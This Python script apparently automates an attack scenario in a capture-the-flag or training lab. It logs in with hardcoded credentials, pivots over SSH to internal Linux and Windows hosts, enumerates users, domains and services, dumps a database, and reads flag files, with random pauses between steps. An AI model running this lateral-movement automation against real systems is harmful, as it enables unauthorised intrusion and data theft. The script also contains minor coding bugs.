import paramiko
import time
from functools import partial
import re
import random

LINUX_OS = 0
WINDOWS_OS = 1

DEFAULT_COLOR = '\x1b[39m'
CYAN_COLOR = '\x1b[36m'
BLUE_COLOR = '\x1b[34m'
GREEN_COLOR = '\x1b[32m'

global prompt
primary_prompt = 'PROMPT1$>'

def remove_ansi_escape_sequences(input_string):
    # Regular expression to match ANSI escape sequences
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    # Substitute matches with an empty string
    return ansi_escape.sub('', input_string)

# Function to set the prompt on the current shell
# everytime our global prompt should change we have to update it here
# if it is not done automatically on the server side
def set_prompt(prompt, channel, os):
    if os == 0:
        channel.send(f'PS1="{prompt}"\n')
    else:
        channel.send(f"function prompt {{ '{prompt}' }}")

    time.sleep(0.5)
    # Clear any initial data
    while channel.recv_ready():
        channel.recv(1024)

def send_command(channel, command, password_prompt=None, password=None, os=LINUX_OS):
    '''Send a command to the shell and return its output.'''
    global prompt

    # we are burning and need to change back to the old prompt
    # *** THIS ASSUMES WE ARE EXITING BACK TO THE FIRST HOP ***
    if command == 'exit':
        prompt = primary_prompt

    print(CYAN_COLOR + 'Sending:', command + DEFAULT_COLOR)
    if os==0:
        channel.send(command + '\n')
    else:
        channel.send(command + '\r\n')

    output = ''
    while True:
        time.sleep(.1)  # Short delay to wait for the command to execute
        if channel.recv_ready():
            recv = channel.recv(4096).decode('utf-8').replace('\r', '')
            recv = remove_ansi_escape_sequences(recv)
            output += recv

            # Handle fingerprint authentication prompt
            if 'Are you sure you want to continue connecting (yes/no/[fingerprint])?' in recv:
                channel.send('yes\n')
                continue
            # Handle password prompt
            if password_prompt and password_prompt.lower() in recv.lower():
                channel.send(password + '\n')
                # we are now logged in. Break to give back control so the prompt can be changed by the calling function
                break
            # Break when the expected prompt is found
            if prompt in recv:
                break
    # Clean up the output by removing the command and prompts
    lines = output.split('\n')
    # Remove lines that contain the command and prompts
    cleaned_lines = []
    for line in lines:
        if line.strip() == command.strip() or prompt.strip() in line.strip():
            continue
        if password_prompt and password_prompt.lower() in line.lower():
            continue
        cleaned_lines.append(line)
    return_value = '\n'.join(cleaned_lines).strip()
    print(return_value + DEFAULT_COLOR)
    return return_value


def ssh_into_server(hostname, username, password, port=22):
    '''Establish an SSH connection to a server and return the SSH client and channel.'''
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname=hostname, username=username, password=password, port=port)
    channel = ssh_client.invoke_shell()
    return ssh_client, channel

# do a pivot on ssh
# os = 0 if pivoting to linux, os = 1 if pivoting to windows
def ssh_chain(channel, server_info, os):
    '''SSH into a server from an existing channel and set the prompt.'''
    ssh_command = f'ssh {server_info["username"]}@{server_info["hostname"]}'

    global prompt
    prompt = server_info['prompt']

    send_command(
        channel,
        ssh_command,
        password_prompt='password:',
        password=server_info['password'],
        os=os
    )

    set_prompt(prompt, channel, os)


# all of this is custom to the anonymous ftp login
def ftp_chain(channel, server_info):
    ftp_command = f'ftp {server_info["hostname"]}'

    # tell it to expect the ftp prompt now
    global prompt
    prompt = 'ftp>'

    # in this case we are using the password as the username because we are signing in an anon account
    send_command(
        channel,
        ftp_command,
        password_prompt='Name (',
        password='anonymous',
        os=LINUX_OS  # ftp server only funs on linux machine
    )

# First server details
first_server = {
    'hostname': '129.21.255.22',    # Replace with your server's IP
    'username': 'root',
    'password': 'root',             # Replace with your password
    'port': 22
}

# List of second-hop servers
# servers with multiple methods will have multiple entries
pivot_servers = [
    {
        'name'    : 'Database Server',
        'hostname': '192.168.1.36',
        'username': 'uws-it',
        'password': 'uwsit2021',
        'prompt'  : 'PROMPT2$>',
        'os'      : LINUX_OS,
        'info_gather_commands' : [
            'ls',
            'whoami',
            'pwd',
            'cd /etc,ls',
            'ifconfig',
            'systemctl --no-pager status mysql',
            'ps aux | grep mysql',
            'hostname',
            'uname -a',
            'cat /proc/version'
        ],
        'get_flag_commands' : [
            'sudo mysql -u root',
            'show databases;,use employees;,show tables;,select * from employees;,quit'
        ]
    },
    {
        'name'   : 'FTP Server',
        'hostname': '192.168.1.27',
        'username': 'ftp-user',
        'password': 'ftp-pass',
        'prompt'  : 'PROMPT5$>',
        'os'      : LINUX_OS,
        'info_gather_commands' : [
            'ls',
            'whoami',
            'ifconfig',
            'systemctl --no-pager status vsftpd',
            'ps aux | grep ftp',
            'cat /etc/vsftpd.conf'
            'ls /srv',
            'ls /srv/ftp'
        ],
        'get_flag_commands' : [
            'cd /srv/ftp,cat flag.txt',
            'cat /srv/ftp/flag.txt'
        ]
    },
    {
        'name'   : 'Windows Host',
        'hostname': '192.168.1.29',
        'username': 'user',
        'password': 'win-pass',
        'prompt'  : 'PROMPT3$>',
        'os'      : WINDOWS_OS,
        'info_gather_commands' : [
            'pwd',
            'echo $HOME,cd C:\\users\\user\\Desktop,dir',
            'dir',
            'Get-ComputerInfo',
            'Get-HotFix',
            'Get-NetIPConfiguration',
            'Get-LocalUser',
            'Get-MpComputerStatus'
        ],
        'get_flag_commands' : [
            'cd C:\\users\\user\\Desktop,cat flag.txt'
        ]
    },
    {
        'name'   : 'Windows Server',
        'hostname': '192.168.1.37',
        'username': 'Administrator',
        'password': 'Admin123!',
        'prompt'  : 'PROMPT4$>',
        'os'      : WINDOWS_OS,
        'info_gather_commands' : [
            'Get-WindowsFeature',
            'Get-Service',
            'Get-NetIPAddress',
            'Get-DnsServerZone',
            'Get-ADDomain',
            'Get-NetFirewallRule',
            'Get-Volume',
            'Get-LocalGroupMember -Group Administrators'
        ],
        'get_flag_commands' : [
            'cd C:\\users\\Administrator\\Desktop,cat flag.txt'
        ]
    } 
]

firsthop_info_gathering_commands = [
    'whoami',
    'ifconfig',
    'cat /etc/resolv.conf',
    'ping -c 4 192.168.1.24',
    'ping -c 4 192.168.1.29',
    'ping -c 4 192.168.1.37',
    'ping -c 4 192.168.1.36',
    'systemctl --no-pager status apache2',
    'cd /home/it-dept,cat flag.txt'
]

def random_command_sleep():
    sleep_time = random.uniform(1,7)
    print(BLUE_COLOR + f'Sleeping for {sleep_time:.2f} seconds' + DEFAULT_COLOR)
    time.sleep(sleep_time)


def send_command_string(channel, command_string, os, old_prompt=None):
    global prompt
    for command in command_string.split(','):
        if command == 'quit' or command =='exit':
            prompt = old_prompt
        send_command(channel, command, os=os)
        random_command_sleep()

def main():
    # global prompt variable for keeping track of current connection's prompt
    global prompt

    # Initialize SSH connection to the first server
    ssh_client, channel = ssh_into_server(
        hostname=first_server['hostname'],
        username=first_server['username'],
        password=first_server['password'],
        port=first_server['port']
    )

    pivot_database = partial(ssh_chain, channel=channel, server_info=pivot_servers[0], os=LINUX_OS)
    pivot_ftp = partial(ftp_chain, channel=channel, server_info=pivot_servers[1], os=LINUX_OS)
    pivot_ftp_ssh = partial(ssh_chain, channel=channel, server_info=pivot_servers[1], os=LINUX_OS)
    pivot_windows_host = partial(ssh_chain, channel=channel, server_info=pivot_servers[2], os=WINDOWS_OS)
    pivot_windows_server = partial(ssh_chain, channel=channel, server_info=pivot_servers[3], os=WINDOWS_OS)

    # Set unique shell prompts
    prompt = primary_prompt
    set_prompt(prompt, channel, LINUX_OS)

    # send commands on first pivot host
    print(GREEN_COLOR + 'First hop info gathering commands' + DEFAULT_COLOR)
    for command_string in random.sample(firsthop_info_gathering_commands, 5):
        send_command_string(channel, command_string, LINUX_OS)
        random_command_sleep()

    pivot_choice = random.randint(0,3)
    # get rid of this
    pivot_choice = 3

    print(GREEN_COLOR + 'Pivoting...' + DEFAULT_COLOR)
    if pivot_choice == 0:
        pivot_database()
    elif pivot_choice == 1:  # TODO randomly decide to use FTP here for this instead of SSH
        pivot_ftp_ssh()
    elif pivot_choice == 2:
        pivot_windows_host()
    elif pivot_choice == 3:
        pivot_windows_server()

    print(GREEN_COLOR + 'Info gathering commands on the remote host' + DEFAULT_COLOR)
    # randomly do info gathering commands on the remote host
    server_info = pivot_servers[pivot_choice]
    for command_string in random.sample(server_info['info_gather_commands'], 5):
        send_command_string(channel, command_string, server_info['os'])

    print(GREEN_COLOR + 'Get flag commands on remote host' + DEFAULT_COLOR)
    # now do get flag commands
    # 0=database, 1=ftp, 2=windows host, 3=windows server
    if pivot_choice == 0:  # database
        change_command = server_info['get_flag_commands'][0]
        old_prompt = prompt
        prompt = 'mysql>'
        send_command(channel, change_command, password_prompt='[sudo] password', password='uwsit2021', os=server_info['os'])
        send_command_string(channel, server_info['get_flag_commands'][1], server_info['os'], old_prompt=old_prompt)
        random_command_sleep()
    elif pivot_choice == 1:  # ftp server
        command_choice = random.randint(0,1)
        send_command_string(channel, server_info['get_flag_commands'][command_choice], server_info['os'])
        random_command_sleep()
    elif pivot_choice == 2:  # windows host
        send_command_string(channel, server_info['get_flag_commands'][0], server_info['os'])
        random_command_sleep()
    elif pivot_choice == 3:  # windows server
        send_command_string(channel, server_info['get_flag_commands'][0], server_info['os'])
        random_command_sleep()
    else:
        print('Should not be here...')

    print(GREEN_COLOR + 'Burn off the pivot host' + DEFAULT_COLOR)
    # Burn off the pivot host
    send_command(channel, 'exit', os=server_info['os'])  # when running with exit it is already assumed that we are burning to the first hop host

    # Close the SSH connection to the first server
    ssh_client.close()


if __name__ == '__main__':
    main()

